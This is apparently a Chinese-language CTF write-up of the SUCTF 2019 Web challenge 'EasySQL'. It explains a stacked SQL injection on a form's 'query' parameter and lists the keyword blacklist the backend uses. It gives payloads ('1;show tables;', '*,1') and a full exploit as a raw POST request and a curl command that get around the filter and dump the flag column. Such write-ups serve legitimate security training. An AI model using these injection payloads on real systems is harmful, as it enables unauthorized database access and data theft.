---
title: SUCTF 2019 - Web - EasySQL
date: 2026-11-14 18:22:00
categories:
  - CTF
  - SUCTF 2019
  - Web
tags:
  - SQL注入
  - 堆叠注入
  - 关键字过滤绕过
  - 列枚举
cover: /img/cover/sword-girl-blue-sky.jpg
description: SUCTF 2019 Web 简单题，考表单参数的堆叠注入与关键字过滤绕过。后端把输入直接拼进查询并回显结果数组，过滤了部分关键字但放行星号，提交星号加常数让星号展开所有列，无需写出被拦的关键字即可回显答案列内容。
keywords:
  - EasySQL
  - 堆叠注入
  - query参数
  - 关键字过滤
  - 星号绕过
ai: >-
  本题来自 SUCTF 2019 Web 方向简单难度，入口是一个表单参数。后端把输入直接拼接进查询并回显结果数组：提交常数得到数组，追加建表查询能列出表名，由此确认存在堆叠注入。过滤规则较严，查询来源、联合、条件以及答案关键字等都会触发拦截，但查询、展示与星号被放行。关键突破在于后端语句形如查询加输入，星号会展开成所有列，因此无需显式写出被过滤的关键字，直接提交星号加常数即可让结果数组回显整张表的答案列内容。最终拿到脱敏后的 flag，平台提交通过并加分。核心教训是列名关键字被过滤时应回到查询结构本身，用星号枚举而非硬拼关键字。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | SUCTF 2019 |
| 方向 | Web |
| 难度 | Easy |
| 分值 | 1 |
| 环境 | 授权靶场（已脱敏） |

> 练习场、题目及提交相关的实例标识已按要求删除；靶场相关信息统一记为「授权靶场（已脱敏）」。

## 信息收集

- 首页是一个 POST 表单，参数 `query`。
- 后端将用户输入直接拼入 SQL 查询并回显结果数组。
- `query=1` → `Array([0]=>1)`；`query=1;show tables;` → 表名 `Flag`，可确认**堆叠注入**。

## 漏洞分析

### 类型

SQL 注入（堆叠注入 + 列枚举）

### 过滤规则

触发 `Nonono.` 的关键字：

```text
from  where  union  handler  or  and
insert  update  delete  drop  prepare  outfile
flag  Flag  information_schema
```

不过滤的关键字：

```text
select  show  columns  desc  set  concat
```

注意 `*` 同样可用，且 `flag` 关键字只在「用户输入里显式写出」时才被拦。

### 原理

后端 SQL 形如 `select <input>`，用户输入被整体拼接到 `select` 之后。由于 `*` 会展开成表的所有列，只要让查询命中含 flag 的表，直接提交 `*,1` 就能把 flag 列内容回显出来，完全绕过对 `flag` 字面量的过滤。

## 利用过程

1. **确认注入点**：POST `query=1` → `Array([0]=>1)`；`query=0` → 空；`query=1'` → 空（引号破坏查询）。
2. **堆叠注入枚举**：`query=1;show tables;` → 表名 `Flag`；`1;show databases;` → `ctf`、`ctftraining`、`information_schema`、`mysql`、`performance_schema`、`test`。
3. **过滤识别**：fuzz 各关键字，确定 `select` 不过滤、`from`/`flag`/`Flag` 被过滤。
4. **关键 payload**：提交 `*,1`，星号展开所有列，直接枚举出 flag 列内容：

```php
Array
(
    [0] => flag{xxxx}
    [1] => 1
)
```

> flag 列真实值已脱敏为 `flag{xxxx}`。

## 完整 EXP

> 同目录 `payload` 归档内容已并入本节。

```http
POST / HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

query=*,1
```

```bash
curl -X POST "http://target:8080/" -d "query=*,1"
```

过滤规则 / 绕过思路（源 wp 归档小结）：

```text
# 触发 Nonono. 的关键字：
#   from, where, union, handler, or, and
#   insert, update, delete, drop, prepare, outfile
#   flag, Flag, information_schema
# 不过滤：select, show, columns, desc, set, concat
# 绕过：后端 SQL 形如 select <input>，* 展开所有列，
#       flag 列内容直接回显，无需显式写 flag 关键字。
```

## Flag

`flag{xxxx}`（真实值已脱敏）。平台提交结果：accepted，+1 分（相关实例标识已删除）。

## 踩坑与总结

1. **先确认注入形态**：`query=1` 回显数组、`show tables` 列表名，两步定位堆叠注入。
2. **过滤清单要 fuzz 出来**：`from`/`flag` 被拦，但 `select`、`show`、`*` 放行，决定了绕过方向。
3. **回到查询结构**：SQL 是 `select <input>` 时，`*,1` 直接展开列，比费劲拼接 `from Flag` 更省事，也绕开了关键字黑名单。
4. **星号是枚举神器**：列名关键字被过滤时，优先想「能不能让数据库自己展开列名」。
5. 结论以靶机实际响应与平台 accepted 为准，不臆测后端源码。

> 仅记录授权靶场环境下的研究；curl 命令与过滤规则来自本地 WP 归档 `payload` 文件。
